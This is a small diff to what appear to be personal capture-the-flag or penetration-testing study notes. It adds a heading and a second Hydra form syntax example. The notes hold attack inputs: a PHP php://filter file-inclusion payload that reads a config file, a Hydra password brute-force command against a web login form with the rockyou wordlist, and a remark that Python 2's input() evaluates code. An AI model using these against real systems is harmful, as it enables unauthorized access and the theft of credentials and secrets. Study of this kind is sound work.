@@ -1,4 +1,4 @@
-Learnings:
+## Learnings:
 input() in python2 is not safe, equivalent to eval() 
 exploiting input() command: 
 
@@ -11,4 +11,5 @@ index.php?file=php://filter/convert.base64-encode/resource=config
 
 ## Hydra:
 hydra -s 45885 -l admin www.bruteforce.me -P rockyou.txt http-form-post "/:password=^PASS^:F=Invalid"
+"/login.php:user=^USER^&pass=^PASS^:S=successful"  from docs.
 follow the format ' path : inputs : F=failure condition"   , -s specifies port , even if u send pass only, specify user for it to run smoothly
